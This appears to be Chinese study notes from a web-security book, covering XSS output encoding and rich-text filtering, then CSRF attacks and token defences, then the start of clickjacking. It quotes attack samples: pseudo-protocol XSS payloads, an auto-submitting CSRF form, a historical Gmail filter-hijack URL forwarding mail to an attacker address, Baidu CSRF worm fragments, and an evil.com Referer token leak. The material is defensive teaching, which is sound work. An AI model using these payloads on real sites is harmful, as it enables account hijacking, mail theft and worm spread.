<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">String safe = ESAPI.encoder().encodeForCSS( request.getParameter( &quot;input&quot; ) );</div><div class="line">其实现原理类似于ESAPI.encoder().encodeForJavaScript()函数，除了字母、数字外的所有字符都被编码成十六进制形式“\uHH”。</div></pre></td></tr></table></figure>
<p>在地址中输出</p>
<p>在地址中输出也比较复杂。一般来说，在URL的path（路径）或者search（参数）中输出，使用URLEncode即可。URLEncode会将字符转换为<code>%HH</code>形式，比如空格就是<code>%20</code>，<code>&lt;</code>符号是<code>%3c</code>。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test=$var"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p>可能的攻击方法：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.evil.com/?test="</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>"" &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
<p>经过URLEncode后，变成了：<code>&lt;a href=&quot;http://www.evil.com/?test=%22%20onclick%3balert%281%29%22&quot; &gt;test&lt;/a&gt;</code><br>但是还有一种情况，就是整个URL能够被用户完全控制。这时URL的Protocal和Host部分是不能够使用URLEncode的，否则会改变URL的语义。</p>
<p>在Protocal 与Host中，如果使用严格的URLEncode函数，则会把“://”、“.”等都编码掉。<br>对于如下的输出方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=&quot;$var&quot; &gt;test&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>攻击者可能会构造伪协议实施攻击：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;a href=&quot;javascript:alert(1);&quot; &gt;test&lt;/a&gt;</div></pre></td></tr></table></figure>
<p>除了“javascript”作为伪协议可以执行代码外，还有“vbscript”、“dataURI”等伪协议可能导致脚本执行。<br>“dataURI”这个伪协议是Mozilla所支持的，能够将一段代码写在URL里。如下例：<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">test</a><br>这段代码的意思是，以text/html的格式加载编码为base64的数据，加载完成后实际上是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;alert(1);&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>点击<code>&lt;a&gt;</code>标签的链接，将导致执行脚本。</p>
<p>执行恶意脚本</p>
<p>由此可见，如果用户能够完全控制URL，则可以执行脚本的方式有很多。如何解决这种情况呢？<br>一般来说，如果变量是整个URL，则应该先检查变量是否以“http”开头（如果不是则自动添加），以保证不会出现伪协议类的XSS攻击。<br><a href="$var" >test</a><br>在此之后，再对变量进行URLEncode，即可保证不会有此类的XSS发生了。<br>OWASP ESAPI中有一个URLEncode的实现（此API未解决伪协议的问题）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">String safe = ESAPI.encoder().encodeForURL( request.getParameter( &quot;input&quot; ) );</div></pre></td></tr></table></figure>
<p><hr /></p>
<h3 id="3-3-5-处理富文本"><a href="#3-3-5-处理富文本" class="headerlink" title="3.3.5 处理富文本"></a>3.3.5 处理富文本</h3><p>有些时候，网站需要允许用户提交一些自定义的HTML代码，称之为“富文本”。比如一个用户在论坛里发帖，帖子的内容里要有图片、视频，表格等，这些“富文本”的效果都需要通过HTML代码来实现。<br>如何区分安全的“富文本”和有攻击性的XSS呢？<br>在处理富文本时，还是要回到“输入检查”的思路上来。“输入检查”的主要问题是，在检查时还不知道变量的输出语境。但用户提交的“富文本”数据，其语义是完整的HTML代码，在输出时也不会拼凑到某个标签的属性中。因此可以特殊情况特殊处理。</p>
<p>列出了所有在HTML中可能执行脚本的地方。而一个优秀的“XSS Filter”，也应该能够找出HTML代码中所有可能执行脚本的地方。<br>HTML是一种结构化的语言，比较好分析。通过htmlparser可以解析出HTML代码的标签、标签属性和事件。</p>
<p>在过滤富文本时，“事件”应该被严格禁止，因为“富文本”的展示需求里不应该包括“事件”这种动态效果。而一些危险的标签，比如 <code>&lt;iframe&gt;</code> 、<code>&lt;script&gt;</code> 、<code>&lt;base&gt;</code> 、<code>&lt;form&gt;</code> 等，也是应该严格禁止的。</p>
<p>在标签的选择上，应该使用白名单，避免使用黑名单。比如，只允许<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;div&gt;</code>等比较“安全”的标签存在。</p>
<p>“白名单原则”不仅仅用于标签的选择，同样应该用于属性与事件的选择。</p>
<p>在富文本过滤中，处理CSS也是一件麻烦的事情。如果允许用户自定义CSS、style，则也可能导致XSS攻击。因此尽可能地禁止用户自定义CSS与style。<br>如果一定要允许用户自定义样式，则只能像过滤“富文本”一样过滤“CSS”。这需要一个CSS Parser对样式进行智能分析，检查其中是否包含危险代码。</p>
<p>有一些比较成熟的开源项目，实现了对富文本的XSS检查。<br>Anti-Samy是OWASP上的一个开源项目，也是目前最好的XSS Filter。最早它是基于Java的，现在已经扩展到.NET等语言。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">import org.owasp.validator.html.*;</div><div class="line">Policy policy = Policy.getInstance(POLICY_FILE_LOCATION);</div><div class="line">AntiSamy as = new AntiSamy();</div><div class="line">CleanResults cr = as.scan(dirtyInput, policy);</div><div class="line">MyUserDAO.storeUserProfile(cr.getCleanHTML()); // some custom function</div></pre></td></tr></table></figure>
<p>在PHP中，可以使用另外一个广受好评的开源项目：HTMLPurify。</p>
<p><hr /></p>
<h3 id="3-3-6-防御DOM-Based-XSS"><a href="#3-3-6-防御DOM-Based-XSS" class="headerlink" title="3.3.6 防御DOM Based XSS"></a>3.3.6 防御DOM Based XSS</h3><p>DOM Based XSS是如何形成的呢？回头看看这个例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">function test()&#123;</div><div class="line">  var str = document.getElementById(&quot;text&quot;).value;</div><div class="line">  document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos; &gt;testLink&lt;/a&gt;&quot;;</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">&lt;div id=&quot;t&quot; &gt;&lt;/div&gt;</div><div class="line">&lt;input type=&quot;text&quot; id=&quot;text&quot; value=&quot;&quot; /&gt;</div><div class="line">&lt;input type=&quot;button&quot; id=&quot;s&quot; value=&quot;write&quot; onclick=&quot;test()&quot; /&gt;在button的onclick事件中，执行了test()函数，而该函数中最关键的一句是：</div><div class="line">document.getElementById(&quot;t&quot;).innerHTML = &quot;&lt;a href=&apos;&quot;+str+&quot;&apos; &gt;testLink&lt;/a&gt;&quot;;</div></pre></td></tr></table></figure>
<p>将HTML代码写入了DOM节点，最后导致了XSS的发生。<br>事实上，DOM Based XSS是从JavaScript中输出数据到HTML页面里。而前文提到的方法都是针对“从服务器应用直接输出到HTML页面”的XSS漏洞，因此并不适用于DOM Based XSS。</p>
<p><hr /></p>
<h3 id="3-3-7-换个角度看XSS的风险"><a href="#3-3-7-换个角度看XSS的风险" class="headerlink" title="3.3.7 换个角度看XSS的风险"></a>3.3.7 换个角度看XSS的风险</h3><p>前文谈到的所有XSS攻击，都是从漏洞形成的原理上看的。如果从业务风险的角度来看，则会有不同的观点。<br>一般来说，存储型XSS的风险会高于反射型XSS。因为存储型XSS会保存在服务器上，有可能会跨页面存在。它不改变页面URL的原有结构，因此有时候还能逃过一些IDS的检测。比如IE 8的XSS Filter和Firefox的Noscript Extension，都会检查地址栏中的地址是否包含XSS脚本。而跨页面的存储型XSS可能会绕过这些检测工具。<br>从攻击过程来说，反射型XSS，一般要求攻击者诱使用户点击一个包含XSS代码的URL链接；而存储型XSS，则只需要让用户查看一个正常的URL链接。比如一个Web邮箱的邮件正文页面存在一个存储型的XSS漏洞，当用户打开一封新邮件时，XSS Payload会被执行。这样的漏洞极其隐蔽，且埋伏在用户的正常业务中，风险颇高</p>
<p>从风险的角度看，用户之间有互动的页面，是可能发起XSS Worm攻击的地方。而根据不同页面的PageView高低，也可以分析出哪些页面受XSS攻击后的影响会更大。比如在网站首页发生的XSS攻击，肯定比网站合作伙伴页面的XSS攻击要严重得多。<br>在修补XSS漏洞时遇到的最大挑战之一是漏洞数量太多，因此开发者可能来不及，也不愿意修补这些漏洞。从业务风险的角度来重新定位每个XSS漏洞，就具有了重要的意义。</p>
<p><hr /></p>
<h3 id="3-4-小结"><a href="#3-4-小结" class="headerlink" title="3.4 小结"></a>3.4 小结</h3><p>理论上，XSS漏洞虽然复杂，但却是可以彻底解决的。在设计XSS解决方案时，应该深入理解XSS攻击的原理，针对不同的场景使用不同的方法。同时有很多开源项目为我们提供了参考。</p>
<p><hr /></p>
<h3 id="第4章-跨站点请求伪造（CSRF）"><a href="#第4章-跨站点请求伪造（CSRF）" class="headerlink" title="第4章　跨站点请求伪造（CSRF）"></a>第4章　跨站点请求伪造（CSRF）</h3><p>CSRF的全名是Cross Site Request Forgery，翻译成中文就是跨站点请求伪造。<br>它是一种常见的Web攻击，但很多开发者对它很陌生。CSRF也是Web安全中最容易被忽略的一种攻击方式，甚至很多安全工程师都不太理解它的利用条件与危害，因此不予重视。但CSRF在某些时候却能够产生强大的破坏性。</p>
<p><hr /></p>
<h3 id="4-2-1-浏览器的Cookie策略"><a href="#4-2-1-浏览器的Cookie策略" class="headerlink" title="4.2.1 浏览器的Cookie策略"></a>4.2.1 浏览器的Cookie策略</h3><p>浏览器所持有的Cookie分为两种：一种是“Session Cookie”，又称“临时Cookie”；另一种是“Third-party Cookie”，也称为“本地Cookie”。<br>两者的区别在于，Third-party Cookie是服务器在Set-Cookie时指定了Expire时间，只有到了Expire时间后Cookie才会失效，所以这种Cookie会保存在本地；而Session Cookie则没有指定Expire时间，所以浏览器关闭后，Session Cookie就失效了。</p>
<p>在浏览网站的过程中，若是一个网站设置了Session Cookie，那么在浏览器进程的生命周期内，即使浏览器新打开了Tab页，Session Cookie也都是有效的。Session Cookie保存在浏览器进程的内存空间中；而Third-party Cookie则保存在本地。<br>如果浏览器从一个域的页面中，要加载另一个域的资源，由于安全原因，某些浏览器会阻止Third-party Cookie的发送。</p>
<p>这时再打开一个新的浏览器Tab页，访问同一个域中的不同页面。因为新Tab页在同一个浏览器进程中，因此Session Cookie将被发送。</p>
<p>此时在另外一个域中，有一个页面<code>http://www.b.com/csrf-test.html</code>，此页面构造了CSRF以访问www.a.com。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://www.a.com&quot; &gt;&lt;/iframe&gt;</div></pre></td></tr></table></figure>
<p>这时却会发现，只能发送出Session Cookie，而Third-party Cookie被禁止了。<br>只发送了Session Cookie</p>
<p>这是因为IE出于安全考虑，默认禁止了浏览器在 <code>&lt;img&gt;</code> 、<code>&lt;iframe&gt;</code> 、<code>&lt;script&gt;</code> 、<code>&lt;link&gt;</code>等标签中发送第三方Cookie。</p>
<p>再回过头来看看Firefox的行为。在Firefox中，默认策略是允许发送第三方Cookie的。</p>
<p>由此可见，在本章一开始所举的CSRF攻击案例中，因为用户的浏览器是Firefox，所以能够成功发送用于认证的Third-party Cookie，最终导致CSRF攻击成功。<br>而对于IE浏览器，攻击者则需要精心构造攻击环境，比如诱使用户在当前浏览器中先访问目标站点，使得Session Cookie有效，再实施CSRF攻击。</p>
<p>在当前的主流浏览器中，默认会拦截Third-party Cookie的有：IE 6、IE 7、IE 8、Safari；不会拦截的有：Firefox 2、Firefox 3、Opera、Google Chrome、Android等。</p>
<p>但若CSRF攻击的目标并不需要使用Cookie，则也不必顾虑浏览器的Cookie策略了。</p>
<p><hr /></p>
<h3 id="4-2-2-P3P头的副作用"><a href="#4-2-2-P3P头的副作用" class="headerlink" title="4.2.2 P3P头的副作用"></a>4.2.2 P3P头的副作用</h3><p>P3P Header是W3C制定的一项关于隐私的标准，全称是The Platform for Privacy Preferences。<br>如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程度上来说，将允许浏览器发送第三方Cookie。在IE下即使是<code>&lt;iframe&gt;</code>、<code>&lt;script&gt;</code>等标签也将不再拦截第三方Cookie的发送。<br>在网站的业务中，P3P头主要用于类似广告等需要跨域访问的页面。但是很遗憾的是，P3P头设置后，对于Cookie的影响将扩大到整个域中的所有页面，因为Cookie是以域和path为单位的，这并不符合“最小权限”原则。</p>
<p>正因为P3P头目前在网站的应用中被广泛应用，因此在CSRF的防御中不能依赖于浏览器对第三方Cookie的拦截策略，不能心存侥幸。<br>很多时候，如果测试CSRF时发现<code>&lt;iframe&gt;</code>等标签在IE中居然能发送Cookie，而又找不到原因，那么很可能就是因为P3P头在作怪。</p>
<p><hr /></p>
<h3 id="4-2-3-GET-POST"><a href="#4-2-3-GET-POST" class="headerlink" title="4.2.3 GET? POST?"></a>4.2.3 GET? POST?</h3><p>在CSRF攻击流行之初，曾经有一种错误的观点，认为CSRF攻击只能由GET请求发起。因此很多开发者都认为只要把重要的操作改成只允许POST请求，就能防止CSRF攻击。<br>这种错误的观点形成的原因主要在于，大多数CSRF攻击发起时，使用的HTML标签都是<code>&lt;img&gt;</code> 、<code>&lt;iframe&gt;</code> 、<code>&lt;script&gt;</code> 等带“src”属性的标签，这类标签只能够发起一次GET请求，而不能发起POST请求。而对于很多网站的应用来说，一些重要操作并未严格地区分GET与POST，攻击者可以使用GET来请求表单的提交地址。比如在PHP中，如果使用的是<code>$_REQUEST，而非$_POST获取变量，则会存在这个问题。</code></p>
<p>若服务器端未对请求方法进行限制，则这个请求会通过。<br>如果服务器端已经区分了GET与POST，那么攻击者有什么方法呢？对于攻击者来说，有若干种方法可以构造出一个POST请求。<br>最简单的方法，就是在一个页面中构造好一个form表单，然后使用JavaScript自动提交这个表单。比如，攻击者在www.b.com/test.html中编写如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;form action=&quot;http://www.a.com/register&quot; id=&quot;register&quot; method=&quot;post&quot; &gt;</div><div class="line">&lt;input type=text name=&quot;username&quot; value=&quot;&quot; /&gt;</div><div class="line">&lt;input type=password name=&quot;password&quot; value=&quot;&quot; /&gt;</div><div class="line">&lt;input type=submit name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;script&gt;</div><div class="line">var f = document.getElementById(&quot;register&quot;);</div><div class="line">f.inputs[0].value = &quot;test&quot;;</div><div class="line">f.inputs[1].value = &quot;passwd&quot;;</div><div class="line">f.submit();</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>攻击者甚至可以将这个页面隐藏在一个不可见的iframe窗口中，那么整个自动提交表单的过程，对于用户来说也是不可见的。</p>
<p>在2007年的Gmail CSRF漏洞攻击过程中，安全研究者pdp展示了这一技巧。</p>
<p>首先，用户需要登录Gmail账户，以便让浏览器获得Gmail的临时Cookie。<br>用户登录Gmail</p>
<p>然后，攻击者诱使用户访问一个恶意页面。攻击者诱使用户访问恶意页面<br>在这个恶意页面中，隐藏了一个iframe，iframe的地址指向pdp写的CSRF构造页面。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://www.gnucitizen.org/util/csrf?_method=POST&amp;_enctype=multipart/form-data&amp;_action</div><div class="line">=https%3A//mail.google.com/mail/h/ewt1jmuj4ddv/%3Fv%3Dprf&amp;cf2_emc=true&amp;cf2_email=evil</div><div class="line">inbox@mailinator.com&amp;cf1_from&amp;cf1_to&amp;cf1_subj&amp;cf1_has&amp;cf1_hasnot&amp;cf1_attach=true&amp;tfi&amp;</div><div class="line">s=z&amp;irf=on&amp;nvp_bu_cftb=Create%20Filter</div></pre></td></tr></table></figure>
<p>这个链接的实际作用就是把参数生成一个POST的表单，并自动提交。<br>由于浏览器中已经存在Gmail的临时Cookie，所以用户在iframe中对Gmail发起的这次请求会成功——邮箱的Filter中会新创建一条规则，将所有带附件的邮件都转发到攻击者的邮箱中。<br>恶意站点通过CSRF在用户的Gmail中建立一条规则</p>
<p><hr /></p>
<h3 id="4-2-4-Flash-CSRF"><a href="#4-2-4-Flash-CSRF" class="headerlink" title="4.2.4 Flash CSRF"></a>4.2.4 Flash CSRF</h3><p>Flash也有多种方式能够发起网络请求，包括POST。比如下面这段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">import flash.net.URLRequest;</div><div class="line">import flash.system.Security;</div><div class="line">var url = new URLRequest(&quot;http://target/page&quot;);</div><div class="line">var param = new URLVariables();</div><div class="line">param = &quot;test=123&quot;;</div><div class="line">url.method = &quot;POST&quot;;</div><div class="line">url.data = param;</div><div class="line">sendToURL(url);</div><div class="line">stop();</div></pre></td></tr></table></figure>
<p>除了URLRequest外，在Flash中还可以使用getURL，loadVars等方式发起请求。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">req = new LoadVars();</div><div class="line">req.addRequestHeader(&quot;foo&quot;, &quot;bar&quot;);</div><div class="line">req.send(&quot;http://target/page?v1=123&amp;v2=456&quot;, &quot;_blank&quot;, &quot;GET&quot;);</div></pre></td></tr></table></figure>
<p>在IE 6、IE 7中，Flash发送的网络请求均可以带上本地Cookie；但是从IE 8起，Flash发起的网络请求已经不再发送本地Cookie了。</p>
<p><hr /></p>
<h3 id="4-2-5-CSRF-Worm"><a href="#4-2-5-CSRF-Worm" class="headerlink" title="4.2.5 CSRF Worm"></a>4.2.5 CSRF Worm</h3><p>CSRF Worm</p>
<p>2008年9月，国内的安全组织80sec公布了一个百度的CSRF Worm。<br>漏洞出现在百度用户中心的发送短消息功能中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=用户账户&amp;co=消息内容</div></pre></td></tr></table></figure>
<p>只需要修改参数sn，即可对指定的用户发送短消息。而百度的另外一个接口则能查询出某个用户的所有好友：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://frd.baidu.com/?ct=28&amp;un=用户账户&amp;cm=FriList&amp;tn=bmABCFriList&amp;callback=gotfriends</div></pre></td></tr></table></figure>
<p>将两者结合起来，可以组成一个CSRF Worm——让一个百度用户查看恶意页面后，将给他的所有好友发送一条短消息，然后这条短消息中又包含一张图片，其地址再次指向CSRF页面，使得这些好友再次将消息发给他们的好友，这个Worm因此得以传播。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Step 1：模拟服务器端取得request的参数。</div><div class="line">var lsURL=window.location.href;</div><div class="line">loU = lsURL.split(&quot;?&quot;);</div><div class="line">if (loU.length&gt;1)</div><div class="line">&#123;</div><div class="line">var loallPm = loU[1].split(&quot;&amp;&quot;);</div></pre></td></tr></table></figure>
<p>定义蠕虫页面服务器地址，取得?和&amp;符号后的字符串，从URL中提取感染蠕虫的用户名和感染者的好友用户名。</p>
<p>Step 2：好友json数据的动态获取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var gotfriends = function (x)</div><div class="line">&#123;</div><div class="line">  for(i=0;i&lt;x[2].length;i++)</div><div class="line">  &#123;</div><div class="line">  friends.push(x[2][i][1]);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">loadjson(&apos;&lt;script</div><div class="line">src=&quot;http://frd.baidu.com/?ct=28&amp;un=&apos;+lusername+&apos;&amp;cm=FriList&amp;tn=bmABCFriList&amp;callback</div><div class="line">=gotfriends&amp;.tmp=&amp;1=2&quot;&gt;&lt;\/script&gt;&apos;);</div></pre></td></tr></table></figure>
<p>通过CSRF漏洞从远程加载受害者的好友json数据，根据该接口的json数据格式，提取好友数据为蠕虫的传播流程做准备。</p>
<p>Step 3：感染信息输出和消息发送的核心部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">evilurl=url+&quot;/wish.php?from=&quot;+lusername+&quot;&amp;to=&quot;;</div><div class="line">sendmsg=&quot;http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=[user]&amp;co=[evilmsg]&quot;</div><div class="line">for(i=0;i&lt;friends.length;i++)&#123;</div><div class="line">mysendmsg=mysendmsg+&quot;&amp;&quot;+i;</div><div class="line">eval(&apos;x&apos;+i+&apos;=new Image();x&apos;+i+&apos;.src=unescape(&quot;&quot;+mysendmsg+&apos;&quot;);&apos;);</div></pre></td></tr></table></figure>
<p>将感染者的用户名和需要传播的好友用户名放到蠕虫链接内，然后输出短消息。</p>
<p>这个蠕虫很好地展示了CSRF的破坏性——即使没有XSS漏洞，仅仅依靠CSRF，也是能够发起大规模蠕虫攻击的。</p>
<p><hr /></p>
<h3 id="4-3-1-验证码"><a href="#4-3-1-验证码" class="headerlink" title="4.3.1 验证码"></a>4.3.1 验证码</h3><h3 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h3><p><hr /></p>
<h3 id="4-3-1-验证码-1"><a href="#4-3-1-验证码-1" class="headerlink" title="4.3.1　验证码"></a>4.3.1　验证码</h3><p>验证码被认为是对抗CSRF攻击最简洁而有效的防御方法。<br>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。</p>
<p>但是验证码并非万能。很多时候，出于用户体验考虑，网站不能给所有的操作都加上验证码。因此，验证码只能作为防御CSRF的一种辅助手段，而不能作为最主要的解决方案。</p>
<p><hr /></p>
<h3 id="4-3-2-Referer-Check"><a href="#4-3-2-Referer-Check" class="headerlink" title="4.3.2 Referer Check"></a>4.3.2 Referer Check</h3><p>Referer Check在互联网中最常见的应用就是“防止图片盗链”。同理，Referer Check也可以被用于检查请求是否来自合法的“源”。<br>常见的互联网应用，页面与页面之间都具有一定的逻辑关系，这就使得每个正常请求的Referer具有一定的规律。</p>
<p>比如一个“论坛发帖”的操作，在正常情况下需要先登录到用户后台，或者访问有发帖功能的页面。在提交“发帖”的表单时，Referer的值必然是发帖表单所在的页面。如果Referer的值不是这个页面，甚至不是发帖网站的域，则极有可能是CSRF攻击。</p>
<p>即使我们能够通过检查Referer是否合法来判断用户是否被CSRF攻击，也仅仅是满足了防御的充分条件。Referer Check的缺陷在于，服务器并非什么时候都能取到Referer。很多用户出于隐私保护的考虑，限制了Referer的发送。在某些情况下，浏览器也不会发送Referer，比如从HTTPS跳转到HTTP，出于安全的考虑，浏览器也不会发送Referer。</p>
<p>出于以上种种原因，我们还是无法依赖于Referer Check作为防御CSRF的主要手段。但是通过Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。</p>
<p><hr /></p>
<h3 id="4-3-3-Anti-CSRF-Token"><a href="#4-3-3-Anti-CSRF-Token" class="headerlink" title="4.3.3 Anti CSRF Token"></a>4.3.3 Anti CSRF Token</h3><p>Anti CSRF Token</p>
<p>现在业界针对CSRF的防御，一致的做法是使用一个Token</p>
<p>CSRF的本质</p>
<p>CSRF为什么能够攻击成功？其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。<br>攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求；反之，攻击者将无法攻击成功。</p>
<p>出于这个原因，可以想到一个解决方案：把参数加密，或者使用一些随机数，从而让攻击者无法猜测到参数值。这是“不可预测性原则”的一种应用（参考“我的安全世界观”一章）。<br>比如，一个删除操作的URL是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://host/path/delete?username=abc&amp;item=123</div></pre></td></tr></table></figure>
<p>把其中的username参数改成哈希值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://host/path/delete?username=md5(salt+abc)&amp;item=123</div></pre></td></tr></table></figure>
<p>这样，在攻击者不知道salt的情况下，是无法构造出这个URL的，因此也就无从发起CSRF攻击了。而对于服务器来说，则可以从Session或Cookie中取得“username=abc”的值，再结合salt对整个请求进行验证，正常请求会被认为是合法的。</p>
<p>但是这个方法也存在一些问题。首先，加密或混淆后的URL将变得非常难读，对用户非常不友好。其次，如果加密的参数每次都改变，则某些URL将无法再被用户收藏。最后，普通的参数如果也被加密或哈希，将会给数据分析工作带来很大的困扰，因为数据分析工作常常需要用到参数的明文。</p>
<p>因此，我们需要一个更加通用的解决方案来帮助解决这个问题。这个方案就是使用Anti CSRF Token。</p>
<p>回到上面的URL中，保持原参数不变，新增一个参数Token。这个Token的值是随机的，不可预测：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://host/path/delete?username=abc&amp;item=123&amp;token=[random(seed)]</div></pre></td></tr></table></figure>
<p>Token需要足够随机，必须使用足够安全的随机数生成算法，或者采用真随机数生成器（物理随机，请参考“加密算法与随机数”一章）。Token应该作为一个“秘密”，为用户与服务器所共同持有，不能被第三者知晓。在实际应用时，Token可以放在用户的Session中，或者浏览器的Cookie中。<br>由于Token的存在，攻击者无法再构造出一个完整的URL实施CSRF攻击。</p>
<p>Token需要同时放在表单和Session中。在提交请求时，服务器只需验证表单中的Token，与用户Session（或Cookie）中的Token是否一致，如果一致，则认为是合法请求；如果不一致，或者有一个为空，则认为请求不合法，可能发生了CSRF攻击。</p>
<p>如下这个表单中，Token作为一个隐藏的input字段，放在form中：隐藏字段中的Token<br>同时Cookie中也包含了一个Token：Cookie中的Token</p>
<p>Anti CSRF Token在使用时，有若干注意事项。</p>
<p>防御CSRF的Token，是根据“不可预测性原则”设计的方案，所以Token的生成一定要足够随机，需要使用安全的随机数生成器生成Token。<br>此外，这个Token的目的不是为了防止重复提交。所以为了使用方便，可以允许在一个用户的有效生命周期内，在Token消耗掉前都使用同一个Token。但是如果用户已经提交了表单，则这个Token已经消耗掉，应该再次重新生成一个新的Token。<br>如果Token保存在Cookie中，而不是服务器端的Session中，则会带来一个新的问题。如果一个用户打开几个相同的页面同时操作，当某个页面消耗掉Token后，其他页面的表单内保存的还是被消耗掉的那个Token，因此其他页面的表单再次提交时，会出现Token错误。在这种情况下，可以考虑生成多个有效的Token，以解决多页面共存的场景。<br>最后，使用Token时应该注意Token的保密性。Token如果出现在某个页面的URL中，则可能会通过Referer的方式泄露。比如以下页面：<br><a href="http://host/path/manage?username=abc&amp;token=[random">http://host/path/manage?username=abc&amp;token=[random</a>]<br>这个manage页面是一个用户面板，用户需要在这个页面提交表单或者单击“删除”按钮，才能完成删除操作。<br>在这种场景下，如果这个页面包含了一张攻击者能指定地址的图片：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;img src=&quot;http://evil.com/notexist&quot; /&gt;</div><div class="line">则“http://host/path/manage?username=abc&amp;token=[random]”会作为HTTP请求的Referer发送到evil.com的服务器上，从而导致Token泄露。</div></pre></td></tr></table></figure>
<p>因此在使用Token时，应该尽量把Token放在表单中。把敏感操作由GET改为POST，以form表单（或者AJAX）的形式提交，可以避免Token泄露。<br>此外，还有一些其他的途径可能导致Token泄露。比如XSS漏洞或者一些跨域漏洞，都可能让攻击者窃取到Token的值。<br>CSRF的Token仅仅用于对抗CSRF攻击，当网站还同时存在XSS漏洞时，这个方案就会变得无效，因为XSS可以模拟客户端浏览器执行任意操作。在XSS攻击下，攻击者完全可以请求页面后，读出页面内容里的Token值，然后再构造出一个合法的请求。这个过程可以称之为XSRF，和CSRF以示区分。</p>
<p>XSS带来的问题，应该使用XSS的防御方案予以解决，否则CSRF的Token防御就是空中楼阁。安全防御的体系是相辅相成、缺一不可的。</p>
<p><hr /></p>
<h3 id="4-4-小结"><a href="#4-4-小结" class="headerlink" title="4.4 小结"></a>4.4 小结</h3><p>本章介绍了Web安全中的一个重要威胁：CSRF攻击。CSRF攻击也能够造成严重的后果，不能忽略或轻视这种攻击方式。<br>CSRF攻击是攻击者利用用户的身份操作用户账户的一种攻击方式。设计CSRF的防御方案必须先理解CSRF攻击的原理和本质。<br>根据“不可预测性原则”，我们通常使用Anti CSRF Token来防御CSRF攻击。在使用Token时，要注意Token的保密性和随机性。</p>
<p><hr /></p>
<h3 id="第5章-点击劫持（ClickJacking）"><a href="#第5章-点击劫持（ClickJacking）" class="headerlink" title="第5章　点击劫持（ClickJacking）"></a>第5章　点击劫持（ClickJacking）</h3><p>2008年，安全专家Robert Hansen与 Jeremiah Grossman发现了一种被他们称为“ClickJacking”（点击劫持）的攻击，这种攻击方式影响了几乎所有的桌面平台，包括IE、Safari、Firefox、Opera以及Adobe Flash。两位发现者准备在当年的OWASP安全大会上公布并进行演示，但包括Adobe在内的所有厂商，都要求在漏洞修补前不要公开此问题。</p>
<p><hr /></p>
<h3 id="5-1-什么是点击劫持"><a href="#5-1-什么是点击劫持" class="headerlink" title="5.1 什么是点击劫持"></a>5.1 什么是点击劫持</h3><p>什么是点击劫持<br>点击劫持是一种视觉上的欺骗手段。攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上。</p>
<p>点击劫持攻击与CSRF攻击（详见“跨站点请求伪造”一章）有异曲同工之妙，都是在用户不知情的情况下诱使用户完成一些动作。但是在CSRF攻击的过程中，如果出现用户交互的页面，则攻击可能会无法顺利完成。与之相反的是，点击劫持没有这个顾虑，它利用的就是与用户产生交互的页面。</p>
<p>twitter也曾经遭受过“点击劫持攻击”。安全研究者演示了一个在别人不知情的情况下发送一条twitter消息的POC，其代码与上例中类似，但是POC中的iframe地址指向了：</p>
